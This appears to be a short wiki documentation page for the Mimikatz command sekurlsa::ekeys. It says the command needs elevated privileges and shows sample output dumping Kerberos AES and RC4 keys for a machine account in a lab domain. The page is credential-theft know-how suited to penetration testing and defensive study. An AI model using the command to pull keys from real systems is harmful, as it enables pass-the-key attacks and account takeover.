# ekeys

`sekurlsa::ekeys` lists Kerberos encryption keys.

{% hint style="warning" %}
This command requires elevated privileges (by previously running [`privilege::debug`](../privilege/debug.md) or by executing Mimikatz as the `NT-AUTHORITY\SYSTEM` account).
{% endhint %}

```
mimikatz # sekurlsa::ekeys

Authentication Id : 0 ; 697146 (00000000:000aa33a)
Session           : Service from 0
User Name         : MediaAdmin$
Domain            : hacklab
Logon Server      : DC
Logon Time        : 10/17/2021 4:22:01 AM
SID               : S-1-5-21-2725560159-1428537199-2260736313-1427

         * Username : MediaAdmin$
         * Domain   : HACKLAB.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       d615e9a2f1e538d23478b03efb5ef470b16f352bbd9afa6f28408d1ff893c1c7
           rc4_hmac_nt       35950fdc8d3d99b4136510414009662d
           rc4_hmac_old      35950fdc8d3d99b4136510414009662d
           rc4_md4           35950fdc8d3d99b4136510414009662d
           rc4_hmac_nt_exp   35950fdc8d3d99b4136510414009662d
           rc4_hmac_old_exp  35950fdc8d3d99b4136510414009662d
```
